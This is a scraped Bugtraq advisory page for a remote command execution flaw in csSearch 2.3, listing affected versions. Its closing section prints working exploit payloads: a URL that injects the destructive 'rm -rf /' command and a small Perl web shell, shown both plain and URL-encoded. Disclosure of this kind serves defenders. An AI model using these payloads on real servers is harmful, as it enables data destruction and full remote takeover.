#SpeeDr00t@Black Falcon<br>#bid4368<p><b><span style="font-size: 18pt;">CSSearch Remote Command Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/4368/info">info</a><br><a href="http://www.securityfocus.com/bid/4368/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/4368/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/4368/solution">solution</a><br><a href="http://www.securityfocus.com/bid/4368/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				4368
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Input Validation Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Mar 26 2002 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Mar 26 2002 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Discovery of this issue is credited to Steve Gustin &lt;stegus1@yahoo.com&gt;.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					CGISCRIPT.NET csSearch 2.3 <br/>
<span class="related">
						
							-
						
						Apache Apache 1.3.24 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.24 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.23 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.23 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.22 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.22 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.20 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.20 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.19 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.19 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.18 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.18 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.17 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.17 <br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
				
					CGISCRIPT.NET csSearch 2.5 <br/>
<span class="related">
						
							-
						
						Apache Apache 1.3.24 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.24 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.23 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.23 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.22 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.22 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.20 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.20 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.19 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.19 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.18 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.18 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.17 <br/>
</span>
<span class="related">
						
							-
						
						Apache Apache 1.3.17 <br/>
</span>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	The following example was submitted:<br/><br/>Configuration data is saved with the following URL.<br/>Note that any perl code would need to be URL encoded.<br/><br/>csSearch.cgi?command=savesetup&amp;setup=PERL_CODE_HERE<br/><br/>For example, the classic "rm -rf /" example would be<br/>as follows:<br/><br/>csSearch.cgi?command=savesetup&amp;setup=`rm%20-rf%20/`<br/><br/>Here's something a little more interesting, less than<br/>300 bytes of code that turns csSearch into a remote<br/>web shell of sorts.<br/><br/>*ShowSearchForm = *Login = sub {<br/>  print "&lt;form method=post action=csSearch.cgi&gt;Enter<br/>Command (eg: ls -l)&lt;br&gt;";<br/>  print "&lt;input type=text name=cmd size=99&gt; ";<br/>  print "&lt;input type=submit value=Execute&gt;&lt;hr&gt;&lt;xmp&gt;";<br/>  $in{'cmd'} &amp;&amp; print `$in{'cmd'} 2&gt;&amp;1`;<br/>  exit;<br/>  };<br/><br/>URL Encoded as:<br/><br/>csSearch.cgi?command=savesetup&amp;setup=*ShowSearchForm%3D*Login%3Dsub{print"&lt;form+method%3Dpost+action%3DcsSearch.cgi&gt;Enter+Comm<br/>and+(example:+ls+-l)&lt;br&gt;&lt;input+type%3Dtext+name%3Dcmd+size%3D99&gt;+&lt;input+type%3Dsubmit+value%3DExecute&gt;&lt;hr&gt;&lt;xmp&gt;";$in{'cmd'}%26<br/>%26print`$in{'cmd'}+2&gt;%261`;exit;};
	
		<ul>
</ul>
</div>